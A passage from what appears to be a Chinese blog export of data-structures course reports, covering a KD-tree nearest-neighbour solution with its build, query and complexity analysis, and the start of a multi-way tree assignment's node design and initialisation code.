class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">FindMedium</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token function">Partion</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> mid<span class="token punctuation">)</span> <span class="token keyword">return</span> k<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&gt;</span> mid<span class="token punctuation">)</span> r <span class="token operator">=</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> l <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次 <code>Partion()</code> 操作的执行都能确定一个元素的正确位置 (若该元素为第 $k$ 大, 那么其一定处于第 $k$ 位), 同时其左的元素均小于该元素, 其右的元素均大于该元素. 如果 <code>Partion</code> 返回的位置恰为序列的中位, 那么中位排序已完成; 否则递归对剩余元素进行中位排序即可.</p><h4 id="建树"><a href="#建树" class="headerlink" title="建树"></a>建树</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 104</span><span class="token keyword">void</span> <span class="token function">Build</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> true<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    comp <span class="token operator">=</span> direction<span class="token punctuation">;</span>    <span class="token function">FindMedium</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">=</span> true<span class="token punctuation">;</span>        <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>rightnode <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PushUp</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中全局变量 <code>int comp</code> 的取值范围为 $[0, dimension - 1]$, 它记录了当前建树时从哪个维度的坐标对当前向量进行排序.</p><p>一个 <code>tree[k]</code> 节点可能会对应多个 <code>Node</code> 向量, 我们调用 <code>FindMedium(l, r)</code> 对这些向量排序, 将按第 <code>comp</code> 维度的坐标排序后的中位向量放置在 <code>Node node[N]</code> 中位 <code>node[mid]</code> 上, 同时满足在其之前的向量的第 <code>comp</code> 维度坐标均小于 <code>node[mid]</code> , 在其之后的向量的第 <code>comp</code> 维度坐标均大于 <code>node[mid]</code>.</p><p>随后将 <code>node[mid]</code> 记录在 <code>tree[k]</code> 中, 并递归建立其左右子树, 在 <code>tree[k]</code> 内使用 <code>bool leftnode</code> 与 <code>bool rightnode</code> 记录, 最后调用 <code>PushUp(k)</code> 自底向顶更新每个 <code>tree[k]</code> 内的节点集所覆盖的区域的端点.</p><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>对于叶节点, 我们在 <code>Build()</code> 中将其覆盖的区域端点设置为该点本身:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span><span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于含有子节点的父节点 <code>tree[k]</code>, 根据我们建树的方式, 其右子节点 <code>tree[right]</code> 必然存在. 首先在右子节点 <code>tree[right]</code> 的覆盖区域内加入点 <code>tree[k].p</code>; 若左子节点 <code>tree[left]</code> 存在, 再使用其覆盖区域更新 <code>tree[k]</code> 的覆盖区域.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 89</span><span class="token keyword">void</span> <span class="token function">PushUp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> true<span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 134</span><span class="token keyword">void</span> <span class="token function">Query</span><span class="token punctuation">(</span>Node p<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ANS <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ANS<span class="token punctuation">,</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> true<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ll left_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ll right_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left_min <span class="token operator">&lt;</span> right_min<span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">else</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> ANS<span class="token punctuation">)</span>            <span class="token function">Query</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出点 <code>Node p</code> 与子树 <code>tree[k]</code>, 我们给出 <code>p</code> 到 <code>tree[k]</code> 中的点的最短距离. 其中 <code>ANS</code> 是一个记录当前查询到的最短距离的全局变量, 在每次总查询前, 我们将其复位为 <code>INF = 1e16</code>.</p><p>首先使用 <code>tree[k]</code> 内记录的点与 <code>p</code> 的距离更新最短距离 <code>ANS</code>; 若左子节点不存在, 特判 <code>p</code> 到 <code>tree[right]</code> 区域的最小值, 当小于 <code>ANS</code> 时执行向下递归查询; 若左子节点存在, 那么同时计算 <code>p</code> 到 <code>tree[left]</code> 区域的最小值, 并首先递归查询距离较短的子树.</p><h4 id="输入与查询"><a href="#输入与查询" class="headerlink" title="输入与查询"></a>输入与查询</h4><p>封装为 <code>Init()</code> 与 <code>Work()</code> 函数.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>起初出现了 <code>Runtime Error(trap 14)</code> 的报错, 在对 <code>Tree[]</code> 进行扩容后消除, 这是因为对 $n$ 个点建立 <code>KD-Tree</code> 需要不止 $n$ 个 <code>Tree</code> 节点来存储.</li><li>使用全局变量 <code>comp</code> 记录当前建树所选取坐标轴的维度, 并在向下递归过程中将其 <code>+ 1</code>.</li><li>首次实现时, 我将所有向量都保存叶节点内, 这样做会导致第 $13$ 个点开始出现 <code>Time Limit Exceeded</code>. 再次实现时, 我在每个内部节点也保存了一个向量值, 并在 <code>Query()</code> 过程向左右子树递归时, 首先访问距离较短的那一个, 起到了剪枝优化的效果.</li><li>对于 <code>FindMedium()</code> 的实现参考了 <a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>Init()</code> 过程读入输入数据的时间复杂度为 $O(nd)$, 建树过程中每一步时间消耗主要源自 <code>FindMedium(l, r)</code>, 这是 $O(n)$ 复杂度的, 逐层建树的时间复杂度为 $O(nlogn)$.</p><p>每次进行 <code>Query()</code> 都进行了剪枝操作, 优化了访问不可能包含答案点的区域的情形. 考虑最坏情况下查询的时间复杂度, 与遍历一棵 $d$ 维 $KD-Tree$ 是等价的, 时间复杂度为 $O(n^{1 - 1/d})$. 进行 $m$ 次查询的时间复杂度为 $O(mn^{1 - 1/d})$.</p><p>综上, 算法总时间复杂度为 $O(nlogn + mn^{1 - 1/d})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>Node</code> 结构体实例占用的空间为: $5\times 4B = 20B$.</p><p>每个 <code>Tree</code> 结构体实例占用的空间为: $10\times 4B + 20B + 4B = 64B$.</p><p>实际占用的 <code>Node</code>, <code>Tree</code> 结构体数目正比于输入数据的规模, 空间复杂度为 $O(nd)$.</p><p>最坏情况下程序所占用的内存约为: $20B\times 10^5 + 64B\times 4\times 10^5 = 26.3MB \ll 256MB$.</p><p>因此空间复杂度满足要求.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build</title>
      <link href="/29/"/>
      <url>/29/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-1-Build"><a href="#3-1-Build" class="headerlink" title="3-1 Build"></a>3-1 Build</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>采用 <code>node</code> 类存储每个节点对应的信息.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 23</span>class node <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>     <span class="token comment">// 父亲编号</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span> <span class="token comment">// 长子编号</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>  <span class="token comment">// 幼子编号</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>       <span class="token comment">// 左兄弟编号</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>       <span class="token comment">// 右兄弟编号</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>       <span class="token comment">// 子树大小</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>     <span class="token comment">// 子树高度</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>     <span class="token comment">// 自身及后缀兄弟结点最大高度</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根节点编号为 <code>1</code>, 所有节点信息默认初始化为 <code>0</code>, 表示相应信息不存在. 其中 <code>suffix</code> 维护了节点本身及其靠后兄弟 <code>height</code> 的最大值, 在每次进行子树移动时, 只需要向前向上维护 <code>size</code>, <code>suffix</code> 并且更新 <code>height</code> 即可, 如此操作可将时间消耗控制在 <code>cost</code> 内.</p><h4 id="void-Init"><a href="#void-Init" class="headerlink" title="void Init()"></a>void Init()</h4><p>首先调用 <code>Init(n)</code> 对多叉树的 <code>parent</code>, <code>firstchild</code>, <code>lastchild</code>, <code>pred</code>, <code>succ</code> 进行初始化.</p><h4 id="void-InitTree"><a href="#void-InitTree" class="headerlink" title="void InitTree()"></a>void InitTree()</h4><p>随后 <code>Init(n)</code> 调用 <code>InitTree(1)</code>, 借助辅助栈 <code>stack</code> 使用后序遍历的迭代情形对多叉树的 <code>size</code>, <code>height</code>, <code>suffix</code> 进行初始化. 类似二叉树的后续遍历, 对于一个节点, 我们首先初始化其 <code>lastchild</code> 直到 <code>firstchild</code>, 最后初始化其本身.</p><h4 id="void-InitNode"><a href="#void-InitNode" class="headerlink" title="void InitNode()"></a>void InitNode()</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 36</span><span class="token keyword">void</span> <span class="token function">InitNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点.</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// 子树根节点.</span>        <span class="token keyword">int</span> child <span class="token operator">=</span> tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>lastchild<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>child<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>            child <span class="token operator">=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于叶子节点, 将其 <code>size</code> 设置为 <code>1</code>, <code>height</code> 设置为 <code>0</code>, <code>suffix</code> 设置为其右兄的 <code>suffix</code> (若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><p>对于一个子树根节点, 将其 <code>size</code> 设置为其子节点的 <code>size</code> 和加 <code>1</code>, <code>height</code> 设置为长子节点的 <code>suffix</code> 加 <code>1</code>, <code>suffix</code> 设置为其自身高度与右兄 <code>suffix</code> 的最大值 